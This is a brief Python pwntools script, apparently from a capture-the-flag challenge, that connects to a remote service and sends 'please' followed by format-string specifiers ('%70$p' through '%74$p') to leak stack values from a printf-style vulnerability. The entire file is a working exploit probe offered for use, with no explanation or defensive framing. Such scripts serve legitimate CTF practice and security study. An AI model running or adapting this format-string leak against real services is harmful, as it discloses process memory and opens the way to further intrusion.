from pwn import *


for i in range(70, 75):
    try:
        r = remote('mc.ax', 31569, level='error')
        # r = process('./please')
        r.readline()
        r.sendline(b'please' + ' %{}$p'.format(i).encode())
        print(i,r.recv())
        r.close()
    except:
        r.close()
